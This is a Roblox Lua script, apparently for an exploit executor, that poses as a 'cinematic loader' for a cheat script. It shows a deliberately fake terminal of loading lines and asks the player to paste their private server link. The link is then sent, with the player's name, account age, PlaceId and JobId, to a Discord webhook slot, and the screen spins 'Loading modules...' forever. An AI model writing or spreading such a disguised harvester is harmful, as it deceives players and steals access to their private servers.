-- JM SCRIPTS CINEMATIC LOADER
-- feito para UI full screen com efeitos

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local SoundService = game:GetService("SoundService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer

-- CONFIG
local DISCORD = "https://discord.gg/ZPz8Renfz"
local WEBHOOK = "COLE_SUA_WEBHOOK_AQUI"

----------------------------------------------------
-- FUNÇÃO: SILENCIAR JOGO
----------------------------------------------------

for _,s in pairs(SoundService:GetDescendants()) do
	if s:IsA("Sound") then
		s.Volume = 0
	end
end

----------------------------------------------------
-- MUSICA CALMA
----------------------------------------------------

local music = Instance.new("Sound")
music.SoundId = "rbxassetid://1843529632"
music.Volume = 0.7
music.Looped = true
music.Parent = workspace
music:Play()

----------------------------------------------------
-- GUI PRINCIPAL
----------------------------------------------------

local gui = Instance.new("ScreenGui")
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local main = Instance.new("Frame")
main.Size = UDim2.new(1,0,1,0)
main.BackgroundColor3 = Color3.fromRGB(0,0,0)
main.Parent = gui

----------------------------------------------------
-- BORDA NEON ANIMADA
----------------------------------------------------

local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(170,0,255)
stroke.Thickness = 3
stroke.Parent = main

spawn(function()
	while true do
		TweenService:Create(stroke,TweenInfo.new(2),{Transparency = 0.2}):Play()
		wait(2)
		TweenService:Create(stroke,TweenInfo.new(2),{Transparency = 0.6}):Play()
		wait(2)
	end
end)

----------------------------------------------------
-- TERMINAL FAKE
----------------------------------------------------

local terminal = Instance.new("TextLabel")
terminal.BackgroundTransparency = 1
terminal.Size = UDim2.new(1,-20,1,-20)
terminal.Position = UDim2.new(0,10,0,10)
terminal.Font = Enum.Font.Code
terminal.TextColor3 = Color3.fromRGB(0,255,0)
terminal.TextSize = 14
terminal.TextXAlignment = Enum.TextXAlignment.Left
terminal.TextYAlignment = Enum.TextYAlignment.Top
terminal.Text = ""
terminal.Parent = main

local function randomLine()

	local modules = {
		"core","network","visual","crypto","auth",
		"memory","loader","engine","ui","module"
	}

	return "Loading "..modules[math.random(1,#modules)].."_"..math.random(1000,9999)..".lua"
end

spawn(function()

	for i=1,80 do
		terminal.Text = terminal.Text.."\n"..randomLine()
		wait(0.04)
	end

	wait(2)

	terminal:Destroy()

end)

----------------------------------------------------
-- PARTICULAS FAÍSCAS
----------------------------------------------------

local particleHolder = Instance.new("Frame")
particleHolder.Size = UDim2.new(1,0,1,0)
particleHolder.BackgroundTransparency = 1
particleHolder.Parent = main

local function createSpark()

	local spark = Instance.new("Frame")
	spark.Size = UDim2.new(0,3,0,3)
	spark.BackgroundColor3 = Color3.fromRGB(255,255,255)
	spark.BorderSizePixel = 0
	spark.Position = UDim2.new(math.random(),0,1,0)
	spark.Parent = particleHolder

	local tween = TweenService:Create(
		spark,
		TweenInfo.new(math.random(3,6)),
		{Position = UDim2.new(spark.Position.X.Scale,0,-0.1,0),Transparency = 1}
	)

	tween:Play()

	game.Debris:AddItem(spark,6)

end

spawn(function()

	while true do
		createSpark()
		wait(0.1)
	end

end)

----------------------------------------------------
-- PAINEL JOGADOR
----------------------------------------------------

local playerBox = Instance.new("Frame")
playerBox.Size = UDim2.new(0,300,0,90)
playerBox.Position = UDim2.new(0,20,1,-110)
playerBox.BackgroundColor3 = Color3.fromRGB(20,20,20)
playerBox.Parent = main

local pStroke = Instance.new("UIStroke")
pStroke.Color = Color3.fromRGB(170,0,255)
pStroke.Parent = playerBox

local infoText = Instance.new("TextLabel")
infoText.BackgroundTransparency = 1
infoText.Size = UDim2.new(1,-10,1,-10)
infoText.Position = UDim2.new(0,5,0,5)
infoText.Font = Enum.Font.Gotham
infoText.TextColor3 = Color3.new(1,1,1)
infoText.TextSize = 16
infoText.TextXAlignment = Enum.TextXAlignment.Left
infoText.TextYAlignment = Enum.TextYAlignment.Top
infoText.Text =
"Player: "..player.Name..
"\nAccount Age: "..player.AccountAge.." days"
infoText.Parent = playerBox

----------------------------------------------------
-- INPUT SERVER PRIVADO
----------------------------------------------------

local serverBox = Instance.new("TextBox")
serverBox.Size = UDim2.new(0,420,0,50)
serverBox.Position = UDim2.new(0.5,-210,0.6,0)
serverBox.PlaceholderText = "Cole o link do servidor privado"
serverBox.Text = ""
serverBox.BackgroundColor3 = Color3.fromRGB(20,20,20)
serverBox.TextColor3 = Color3.new(1,1,1)
serverBox.Parent = main

local sStroke = Instance.new("UIStroke")
sStroke.Color = Color3.fromRGB(170,0,255)
sStroke.Parent = serverBox

----------------------------------------------------
-- BOTÃO DISCORD
----------------------------------------------------

local discordButton = Instance.new("TextButton")
discordButton.Size = UDim2.new(0,200,0,50)
discordButton.Position = UDim2.new(0.5,-100,0.72,0)
discordButton.Text = "Entrar no Discord"
discordButton.BackgroundColor3 = Color3.fromRGB(25,25,25)
discordButton.TextColor3 = Color3.new(1,1,1)
discordButton.Parent = main

local dStroke = Instance.new("UIStroke")
dStroke.Color = Color3.fromRGB(170,0,255)
dStroke.Parent = discordButton

discordButton.MouseButton1Click:Connect(function()

	setclipboard(DISCORD)

	discordButton.Text = "Link copiado!"

end)

----------------------------------------------------
-- WEBHOOK + FINAL
----------------------------------------------------

serverBox.FocusLost:Connect(function()

	local data = {
		content =
		"Player: "..player.Name..
		"\nAccount Age: "..player.AccountAge..
		"\nPrivate Server: "..serverBox.Text..
		"\nPlaceId: "..game.PlaceId..
		"\nServerId: "..game.JobId
	}

	pcall(function()

		request({
			Url = WEBHOOK,
			Method = "POST",
			Headers = {
				["Content-Type"]="application/json"
			},
			Body = HttpService:JSONEncode(data)
		})

	end)

	local thanks = Instance.new("TextLabel")
	thanks.BackgroundTransparency = 1
	thanks.Size = UDim2.new(1,0,0,120)
	thanks.Position = UDim2.new(0,0,0.35,0)
	thanks.Text = "Obrigado por usar nosso script\nNós somos muito gratos!"
	thanks.Font = Enum.Font.GothamBold
	thanks.TextSize = 32
	thanks.TextColor3 = Color3.new(1,1,1)
	thanks.Parent = main

	wait(5)

	thanks.Text = "Loading modules..."

	while true do

		thanks.Text = "Loading modules."
		wait(0.5)

		thanks.Text = "Loading modules.."
		wait(0.5)

		thanks.Text = "Loading modules..."
		wait(0.5)

	end

end)
